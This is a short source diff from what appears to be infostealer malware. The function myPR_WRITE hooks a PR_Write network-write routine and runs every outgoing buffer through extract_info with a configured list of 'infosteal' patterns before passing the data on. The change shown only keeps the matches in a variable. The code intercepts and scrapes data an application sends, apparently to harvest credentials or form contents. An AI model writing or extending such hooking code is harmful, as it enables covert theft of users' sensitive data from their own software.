@@ -10,7 +10,7 @@ pr_io_func pr_read_orig = 0;
 
 int myPR_WRITE(void* fd, void* buf, int amnt) {
 
-	extract_info(buf, conf::infosteal_patterns,amnt);
+	auto matches = extract_info(buf, conf::infosteal_patterns,amnt);
 
 	int f = pr_write_orig(fd, buf, amnt);
 	return f;
